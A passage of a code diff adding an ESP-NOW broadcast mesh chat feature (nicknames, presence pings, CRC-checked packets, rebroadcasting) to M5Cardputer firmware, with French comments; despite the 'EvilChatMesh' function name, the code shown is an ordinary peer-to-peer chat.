+        memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
+        esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
+
+        rememberId(msg.id);
+        addMessage(action);
+        drawChatWindow();
+     } else if (strcmp(input, "/people") == 0) {
+        char buf[MAX_MSG_LEN];
+        addMessage("-> Users online:");
+        for (int i = 0; i < nodesCount; i++) {
+            snprintf(buf, sizeof(buf), " %s", nodesConnected[i].nick);
+            addMessage(buf);
+        }
+        drawChatWindow();
+     } else if (strcmp(input, "/help") == 0) {
+        addMessage("/nick <name> : change pseudo");
+        addMessage("/me <action> : action roleplay");
+        addMessage("/clear : efface le chat");
+        addMessage("/help : commandes");
+        addMessage("/people : online people");
+        drawChatWindow();
+    } else {
+        addMessage("Unknown command. /help");
+        drawChatWindow();
+    }
+}
+
+// ----- Réception -----
+void OnDataRecvChat(const uint8_t *mac, const uint8_t *incomingData, int len) {
+    if (len != sizeof(MeshMessage) + sizeof(uint16_t)) return;
+
+    uint16_t receivedCrc;
+    memcpy(&receivedCrc, incomingData + sizeof(MeshMessage), sizeof(uint16_t));
+    uint16_t computedCrc = crc16(incomingData, sizeof(MeshMessage));
+    if (receivedCrc != computedCrc) return;
+
+    MeshMessage msg;
+    memcpy(&msg, incomingData, sizeof(MeshMessage));
+
+    if (hasSeenId(msg.id)) return;
+    rememberId(msg.id);
+
+    // ----- SI C'EST UN PING, ON MET A JOUR LA PRÉSENCE -----
+    if (strcmp(msg.body, "PING") == 0) {
+        updatePresence(msg.from);
+
+        // On peut rebroadcaster si on veut le mode "mesh"
+        esp_now_send(broadcastAddressEspNow, incomingData, len);
+        // IMPORTANT: NE PAS L'AJOUTER AU CHAT, car c'est juste un ping
+        return;
+    }
+    // Ignorer les messages "System" nous concernant
+    if (strcmp(msg.from, "System") == 0 && strstr(msg.body, currentNick)) {
+        return;
+    }
+    // Sinon c'est un message "classique"
+    char display[MAX_MSG_LEN + 16];
+    snprintf(display, sizeof(display), "%s: %s", msg.from, msg.body);
+    addMessage(display);
+    drawChatWindow();
+
+    // Re-broadcast si vous le désirez en mode "mesh"
+    esp_now_send(broadcastAddressEspNow, incomingData, len);
+}
+
+void broadcastChatMessage(const char* from, const char* body) {
+    // Construction du message
+    MeshMessage msg;
+    char hashOut[9], temp[MAX_MSG_LEN + 32];
+
+    // On calcule un hash sur from + body + l'heure courante (millis())
+    // afin de générer un id unique.
+    snprintf(temp, sizeof(temp), "%s%s%lu", from, body, millis());
+    simpleHash(temp, hashOut);
+
+    strncpy(msg.id, hashOut, 8);
+    msg.id[8] = '\0';
+
+    strncpy(msg.from, from, 15);
+    msg.from[15] = '\0';
+
+    strncpy(msg.body, body, MAX_MSG_LEN - 1);
+    msg.body[MAX_MSG_LEN - 1] = '\0';
+
+    // Prépare le buffer à envoyer : message + CRC16
+    uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
+    memcpy(packet, &msg, sizeof(MeshMessage));
+    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
+    memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
+
+    // Envoie en broadcast
+    esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
+
+    // Évite de re-traiter nous-même ce message si on le reçoit en rebond
+    rememberId(msg.id);
+
+    if (!(strcmp(from, "System") == 0 && strstr(body, currentNick))) {
+        char outLine[MAX_MSG_LEN + 32];
+        snprintf(outLine, sizeof(outLine), "%s: %s", from, body);
+        addMessage(outLine);
+        drawChatWindow();
+    }
+}
+
+void broadcastPing() {
+    MeshMessage msg;
+    char hashOut[9], temp[MAX_MSG_LEN + 16];
+    snprintf(temp, sizeof(temp), "%sPING%lu", currentNick, millis());
+    simpleHash(temp, hashOut);
+
+    strncpy(msg.id, hashOut, 8); 
+    msg.id[8] = '\0';
+
+    strncpy(msg.from, currentNick, 15);
+    msg.from[15] = '\0';
+
+    // On indique clairement "PING" dans le body
+    strncpy(msg.body, "PING", MAX_MSG_LEN - 1);
+    msg.body[MAX_MSG_LEN - 1] = '\0';
+
+    // On calcule le CRC, comme d’habitude
+    uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
+    memcpy(packet, &msg, sizeof(MeshMessage));
+    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
+    memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
+
+    esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
+    // Se souvenir de ce hash, pour éviter la rediffusion en boucle
+    rememberId(msg.id);
+}
+
+void updatePresence(const char* nick) {
+    for (int i = 0; i < nodesCount; i++) {
+        if (strcmp(nodesConnected[i].nick, nick) == 0) {
+            nodesConnected[i].lastSeen = millis();
+            return;
+        }
+    }
+
+    if (nodesCount < MAX_NODES) {
+        strncpy(nodesConnected[nodesCount].nick, nick, 15);
+        nodesConnected[nodesCount].nick[15] = '\0';
+        nodesConnected[nodesCount].lastSeen = millis();
+        nodesCount++;
+    }
+}
+
+
+void checkPresenceTimeouts() {
+    unsigned long now = millis();
+    for (int i = 0; i < nodesCount; i++) {
+        if ((now - nodesConnected[i].lastSeen) > TIMEOUT_PRESENCE) {
+            // Annonce du départ
+            char msgLeave[MAX_MSG_LEN];
+            snprintf(msgLeave, sizeof(msgLeave), "%s left the chat !", nodesConnected[i].nick);
+            broadcastChatMessage("System", msgLeave);
+
+            // Décalage pour supprimer
+            for (int j = i; j < nodesCount - 1; j++) {
+                nodesConnected[j] = nodesConnected[j + 1];
+            }
+            nodesCount--;
+            i--; // Réajuster l’index
+        }
+    }
+}
+
+
+// ----- Clavier -----
+void handleKeyboard() {
+    if (M5Cardputer.Keyboard.isPressed()) {
+        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+
+        for (auto c : status.word) {
+            int len = strlen(inputBuffer);
+            if (len < MAX_MSG_LEN - 2) {
+                inputBuffer[len] = c;
+                inputBuffer[len + 1] = '\0';
+            }
+        }
+
+        if (status.del && strlen(inputBuffer) > 0) {
+            inputBuffer[strlen(inputBuffer) - 1] = '\0';
+        }
+
+        if (status.enter && strlen(inputBuffer) > 0) {
+                if (inputBuffer[0] == '/') {
+                handleCommand(inputBuffer);
+            } else {
+                MeshMessage msg;
+                char hashOut[9], temp[MAX_MSG_LEN + 16];
+                snprintf(temp, sizeof(temp), "%s%s%lu", currentNick, inputBuffer, millis());
+                simpleHash(temp, hashOut);
+
+                strncpy(msg.id, hashOut, 8); msg.id[8] = '\0';
+                strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
+                strncpy(msg.body, inputBuffer, MAX_MSG_LEN - 1); msg.body[MAX_MSG_LEN - 1] = '\0';
+
+                uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
+                memcpy(packet, &msg, sizeof(MeshMessage));
+                uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
+                memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
+                esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
+
+                rememberId(msg.id);
+                char out[MAX_MSG_LEN];
+                snprintf(out, MAX_MSG_LEN, "YOU: %s", inputBuffer);
+                addMessage(out);
+                drawChatWindow();
+            }
+
+            inputBuffer[0] = '\0';
+        }
+
+        M5.Display.fillRect(0, 120, 240, 16, TFT_NAVY);
+        M5.Display.setCursor(0, 120);
+        M5.Display.setTextColor(TFT_YELLOW);
+        M5.Display.print("> ");
+        M5.Display.print(inputBuffer);
+        
+
+    }
+}
+
+// ----- Fonction principale -----
+void EvilChatMesh() {
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.fillScreen(TFT_BLACK);
+    M5.Display.setCursor(0, 0);
+    
+    WiFi.disconnect(true);
+    delay(100);
+    WiFi.mode(WIFI_STA);
+
+    if (esp_now_init() != ESP_OK) {
+        M5.Display.println("ESP-NOW init failed");
+        return;
+    }
+
+    esp_now_register_recv_cb(OnDataRecvChat);
+
+    esp_now_peer_info_t peer = {};
+    memcpy(peer.peer_addr, broadcastAddressEspNow, 6);
+    peer.channel = 0;
+    peer.encrypt = false;
+    if (!esp_now_is_peer_exist(peer.peer_addr)) {
+        esp_now_add_peer(&peer);
+    }
+
+    drawChatWindow();
+    inputBuffer[0] = '\0';
+    
+    char msgArrive[MAX_MSG_LEN];
+    snprintf(msgArrive, sizeof(msgArrive), "%s enter the chat!", currentNick);
+    broadcastChatMessage("System", msgArrive);
+    
+    while (true) {
+        M5.update();
+        M5Cardputer.update();
+
+        unsigned long now = millis();
+        if (now - lastPing > PING_INTERVAL) {
+            lastPing = now;
+            broadcastPing();
+        }
+        checkPresenceTimeouts();
+        if (M5Cardputer.Keyboard.isKeyPressed('`')) {
+          char msgDepart[MAX_MSG_LEN];
+          snprintf(msgDepart, sizeof(msgDepart), "%s left the chat!", currentNick);
+          broadcastChatMessage("System", msgDepart);
+
+          esp_now_unregister_recv_cb();
+          esp_now_deinit();
+
+          waitAndReturnToMenu("Left The Chat...");
+          return;
+        }
+        if (M5Cardputer.Keyboard.isChange()) {
+            handleKeyboard();
+        }
+        delay(10);
+    }
+}
+
